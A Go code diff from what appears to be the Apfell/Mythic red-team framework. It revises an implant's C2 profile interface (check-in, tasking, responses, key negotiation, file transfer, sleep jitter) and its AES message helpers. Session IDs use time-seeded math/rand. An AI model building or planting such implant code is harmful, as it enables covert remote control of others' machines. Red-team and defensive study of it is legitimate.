@@ -1,77 +1,37 @@
 package profiles
 
 import (
-	"crypto/rsa"
 	"encoding/base64"
 	"pkg/utils/crypto"
-
+	"math/rand"
+	"time"
 	"pkg/utils/structs"
+	"encoding/json"
 )
 
-
-const (
-	//CheckInMsg - Messages for apfell
-	CheckInMsg = 0
-	//EKE - Messages for apfell EKE AES
-	EKE = 1
-	//AES - Messages for apfell static AES
-	AES = 2
-	//TaskMsg - Messages for apfell tasks
-	TaskMsg = 3
-	//ResponseMsg - Messages for apfell task responses
-	ResponseMsg = 4
-	//FileMsg - Messages for apfell file downloads/uploads
-	FileMsg = 5
-	// ID Type for UUID
-	UUIDType = 6
-	// ID Type for ApfellID
-	ApfellIDType = 7
-	// ID Type for FileID
-	FileIDType = 8
-	// ID Type for session ID
-	SESSIDType = 9
-	// ID Type for Task ID
-	TASKIDType = 10
+var (
+	ApiVersion = "1.4"
+	seededRand   *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
+	UUID = "UUID_HERE"
+	TaskResponses []json.RawMessage
+	UploadResponses []json.RawMessage
 )
 
 //Profile - Primary interface for apfell C2 profiles
 type Profile interface {
-	// CheckIn method for sending the initial checkin to the server
-	CheckIn(ip string, pid int, user string, host string) interface{}
-	// GetTasking method for retrieving the next task from apfell
-	GetTasking() interface{}
-	// Post a task response to the server
-	PostResponse(task structs.Task, output string) []byte
-	// Start EKE key negotiation for encrypted comms
-	NegotiateKey() string
-	// C2 profile implementation for downloading files
-	SendFile(task structs.Task, params string) structs.ThreadMsg
-	// C2 Profile implementation to get a file with specified id
-	GetFile(fileid string) []byte
-	// C2 profile helper function to send file chunks for file downloads and screenshots
-	SendFileChunks(task structs.Task, data []byte) structs.ThreadMsg
-
-	Header() string
-	SetHeader(hostname string)
-	URL() string
-	SetURL(url string)
-	SetURLs(urls []string)
+	CheckIn(ip string, pid int, user string, host string, os string, arch string) interface{} // CheckIn method for sending the initial checkin to the server
+	GetTasking() interface{}                                          // GetTasking method for retrieving the next task from apfell
+	PostResponse(output []byte, skipChunking bool) []byte             // Post a task response to the server
+	NegotiateKey() string                                             // Start EKE key negotiation for encrypted comms
+	SendFile(task structs.Task, params string, ch chan []byte)                        // C2 profile implementation for downloading files
+	GetFile(task structs.Task, fileDetails structs.FileUploadParams, ch chan []byte)                // C2 Profile implementation to get a file with specified id // C2 profile helper function to retrieve any arbitrary value for a profile
+	SendFileChunks(task structs.Task, data []byte, ch chan []byte)                    // C2 helper function to upload a file
 	SleepInterval() int
 	SetSleepInterval(interval int)
-	C2Commands() []string
-	SetC2Commands(commands []string)
-	XKeys() bool
-	SetXKeys(exchangingkeys bool)
-	SetUserAgent(ua string)
-	GetUserAgent() string
+	SetSleepJitter(jitter int)
 	ApfID() string
 	SetApfellID(newID string)
-	UniqueID() string
-	SetUniqueID(newUUID string)
-	AesPreSharedKey() string
-	SetAesPreSharedKey(newkey string)
-	RsaKey() *rsa.PrivateKey
-	SetRsaKey(newKey *rsa.PrivateKey)
+	ProfileType() string
 }
 
 func NewInstance() interface{} {
@@ -80,18 +40,17 @@ func NewInstance() interface{} {
 
 func EncryptMessage(msg []byte, k string) []byte {
 	key, _ := base64.StdEncoding.DecodeString(k)
-	return []byte(base64.StdEncoding.EncodeToString(crypto.AesEncrypt(key, msg)))
+	return crypto.AesEncrypt(key, msg)
 }
 
 func DecryptMessage(msg []byte, k string) []byte {
 	key, _ := base64.StdEncoding.DecodeString(k)
-	decMsg, _ := base64.StdEncoding.DecodeString(string(msg))
-	return crypto.AesDecrypt(key, decMsg)
+	return crypto.AesDecrypt(key, msg)
 }
 
 func GenerateSessionID() string {
 	const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-	b := make([]byte, 10)
+	b := make([]byte, 20)
 	for i := range b {
 		b[i] = letterBytes[seededRand.Intn(len(letterBytes))]
 	}
